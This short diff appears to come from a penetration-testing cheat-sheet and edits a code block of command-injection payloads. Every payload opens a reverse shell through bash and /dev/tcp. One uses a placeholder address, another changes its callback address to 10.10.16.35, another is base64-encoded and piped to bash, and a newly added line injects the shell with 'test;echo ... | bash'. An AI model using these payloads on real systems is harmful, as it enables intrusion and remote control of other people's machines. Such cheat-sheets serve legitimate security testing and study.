@@ -532,9 +532,11 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 ```
 ;$(bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1');
 
-bash -i >& /dev/tcp/10.10.14.4/1234 0>&1 (payload)
+bash -i >& /dev/tcp/10.10.16.35/1234 0>&1 (payload)
 test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= |
 base64 -d | bash;    (enocoded payload)
+
+test;echo 'bash -i >& /dev/tcp/10.10.16.35/9001 0>&1' | bash;
 ```
 
 #### Opposite to Keyhacks -> nokeyhacks:
